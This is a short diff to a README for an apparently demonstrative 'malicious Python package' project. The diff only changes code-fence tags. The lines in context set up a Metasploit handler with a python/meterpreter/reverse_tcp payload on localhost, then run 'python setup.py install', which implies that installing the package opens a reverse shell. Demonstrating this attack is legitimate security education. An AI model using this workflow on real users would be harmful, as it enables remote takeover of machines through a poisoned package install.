@@ -29,7 +29,7 @@ code from [GitHub](https://github.com/Ayrx/malicious-python-package).
 
 Run the Metasploit listener.
 
-```
+```shell
 msf > use exploit/multi/handler
 msf exploit(handler) > set payload python/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST 127.0.0.1
@@ -37,7 +37,7 @@ msf exploit(handler) > set LHOST 127.0.0.1
 
 Finally, run the setup.py file.
 
-```
+```shell
 python setup.py install
 ```
 
